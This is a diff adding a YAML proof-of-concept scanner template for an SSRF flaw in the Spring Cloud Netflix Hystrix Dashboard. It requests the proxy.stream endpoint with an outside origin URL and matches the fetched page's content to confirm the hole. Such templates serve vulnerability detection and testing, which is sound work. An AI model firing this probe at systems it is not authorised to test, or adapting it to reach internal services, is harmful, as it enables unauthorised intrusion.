@@ -1,0 +1,22 @@
+id: poc-yaml-spring-cloud-netflix-ssrf
+info:
+  name: Spring Cloud Netflix Hystrix Dashboard SSRF 漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: spring_cloud_netflix
+variables:
+  path: '/proxy.stream
+
+    /api/proxy.stream'
+requests:
+- method: GET
+  path: '{{.path}}?origin=http://www.baidu.com'
+  expression: 'status_code == 200 &&
+
+    contains(body, "<title>百度一下，你就知道</title>") &&
+
+    contains(body, "src=//www.baidu.com/img/bd_logo1.png")
+
+    '
+transport: http
